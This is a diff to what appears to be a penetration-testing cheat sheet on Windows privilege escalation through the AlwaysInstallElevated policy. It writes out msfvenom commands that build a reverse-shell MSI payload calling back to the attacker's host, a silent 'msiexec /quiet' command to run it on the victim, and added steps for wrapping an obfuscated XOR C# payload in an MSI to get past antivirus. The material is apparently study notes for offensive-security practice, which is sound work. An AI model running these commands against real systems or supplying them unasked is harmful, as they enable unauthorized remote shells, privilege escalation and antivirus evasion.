@@ -178,8 +178,16 @@ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 prependfork=t
 use exploit/windows/local/always_install_elevated
 ```
 **Via Msfvenom**
-- I cannot get this to work ever
+- I cannot get this to work ever (edit:The suspicion is that AV catches this)
 ```bash
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.31.141 lport=443 -a x64 --platform windows -f msi -o ignite.msi
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali ip> lport=443 -a x64 -f msi -o evil.msi
 
+# onvictim
+msiexec /quiet /qn /i evil.msi
 ```
+
+**Via MSI Wrapper**
+- You need to have your own Windows machine. Download MSI Wrapper from (https://www.exemsi.com/download/)
+- Create an obfuscated exe payload that can bypass AV. Suggest a XOR Csharp payload
+- Wrap that payload using MSI Wrapper
+
